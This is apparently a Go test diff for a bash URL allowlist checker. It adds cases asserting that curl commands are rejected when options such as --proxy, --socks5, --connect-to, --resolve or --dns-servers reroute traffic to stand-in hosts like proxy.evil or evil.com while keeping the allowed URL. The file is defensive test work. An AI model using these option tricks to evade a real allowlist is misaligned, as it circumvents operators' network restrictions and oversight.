@@ -144,6 +144,37 @@ func TestBashURLAllowlistRejectsConfigFileForm(t *testing.T) {
 	}
 }
 
+func TestBashURLAllowlistRejectsConnectionOverrideOptions(t *testing.T) {
+	allowlist := []string{"https://example.com/api"}
+
+	// Each of these keeps the URL string on the allowlist but routes traffic
+	// elsewhere or loads arbitrary configuration.
+	tests := []string{
+		"curl -x http://proxy.evil:3128 https://example.com/api",
+		"curl -xhttp://proxy.evil:3128 https://example.com/api",
+		"curl --proxy http://proxy.evil:3128 https://example.com/api",
+		"curl --proxy=http://proxy.evil:3128 https://example.com/api",
+		"curl --proxy-user user:pass https://example.com/api",
+		"curl --preproxy http://proxy.evil:3128 https://example.com/api",
+		"curl --proxytunnel https://example.com/api",
+		"curl --socks5 proxy.evil:1080 https://example.com/api",
+		"curl --socks5-hostname proxy.evil:1080 https://example.com/api",
+		"curl --socks4 proxy.evil:1080 https://example.com/api",
+		"curl --socks4a proxy.evil:1080 https://example.com/api",
+		"curl --connect-to example.com:443:evil.com:443 https://example.com/api",
+		"curl --resolve example.com:443:127.0.0.1 https://example.com/api",
+		"curl --dns-servers 1.1.1.1 https://example.com/api",
+		"curl --dns-interface eth1 https://example.com/api",
+		"curl --interface eth1 https://example.com/api",
+	}
+
+	for _, cmd := range tests {
+		if err := checkURLAllowlist(cmd, allowlist); err == nil {
+			t.Errorf("expected error for connection-override option in command %q, but got nil", cmd)
+		}
+	}
+}
+
 func TestBashURLAllowlistRejectsStdin(t *testing.T) {
 	allowlist := []string{"https://example.com"}
 
